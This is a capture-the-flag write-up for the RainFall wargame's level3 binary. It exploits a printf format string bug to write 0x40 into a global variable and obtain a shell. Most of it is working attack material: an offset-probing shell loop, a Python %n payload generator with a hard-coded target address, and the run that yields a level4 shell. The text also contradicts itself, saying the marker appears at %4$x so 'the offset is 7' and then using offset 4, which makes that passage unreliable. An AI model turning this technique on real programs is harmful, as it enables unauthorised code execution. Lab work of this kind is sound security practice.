LEVEL_3:
# 📚 Exploiting `level3` – Format String Vulnerability to Overwrite Global Variable

## 🔍 Challenge Summary

The target is a vulnerable binary named `level3` from the RainFall wargame on Linux. Our goal is to:

- Exploit a **format string vulnerability** in `printf()`
- Overwrite a global variable `m` with the value `0x40`
- Satisfy the condition `if (m == 0x40)` to execute `system("/bin/sh")`


## 🔐 Binary Protections

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3


$ cat /proc/sys/kernel/randomize_va_space
0
```
```
void v(void) {
  char local_20c[520];
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);  // ⚠️ format string vulnerability
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
}
```
 ## Exploitation Strategy

    Leak stack contents to determine the correct format string offset
    Use %n to write 0x40 to the address of the global variable m
    Trigger the condition and gain a shell

##  Step 1: Find the Address of m

```
(gdb) p &m
$1 = (int *) 0x0804988c
```
## Step 2: Discover Format String Offset

```
for i in $(seq 1 40); do
  python -c "print('AAAA' + ' %%%d\$x' % $i)" | ./level3
done
```
Look for 41414141 in the output. appears at %4$x, that means the offset is 7.
## Step 3: Exploit Script (Python)
```
import struct
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <offset>")
    sys.exit(1)

offset = int(sys.argv[1])

m_addr = struct.pack("<I", 0x0804988c)  # Address of 'm'
target_val = 0x40  # Decimal 64

written = len(m_addr)
padding = target_val - written
if padding < 0:
    padding += 256

fmt = "%%%dx%%%d$n" % (padding, offset)
payload = m_addr + fmt.encode("ascii")

with open("payload.txt", "wb") as f:
    f.write(payload)

print("Wrote payload with offset %d" % offset)

```
## Step 4: Execute the Exploit
```
python exploit.py 4 
(cat payload.txt; cat) | ./level3
Wait what?!
$ whoami
level4
```
